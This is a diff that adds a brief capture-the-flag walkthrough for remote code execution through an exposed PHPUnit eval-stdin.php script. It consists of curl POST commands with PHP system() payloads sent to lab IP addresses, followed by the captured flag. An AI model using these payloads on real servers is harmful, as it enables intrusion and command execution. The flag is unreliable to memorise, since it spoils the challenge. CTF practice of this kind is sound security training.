@@ -1,0 +1,5 @@
+write http://34.141.12.127:32017/composer.json in the browser we will see "phpunit/phpunit": "5.6.2" that means its vulnarable
+now we try http://34.185.133.186:31244/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php and it will be stuck on loading or wont load which means that the script is there
+now curl -X POST --data "<?php system('ls /'); ?>" http://34.185.133.186:31244/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php for the exploit. we will see flag.txt
+curl -X POST --data "<?php system('cat /flag.txt'); ?>" http://34.185.133.186:31244/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php
+and we get the flag CTF{8c7795c5332da1491741a61fe780006a619273444bfe54aff555e28f83e3b123}
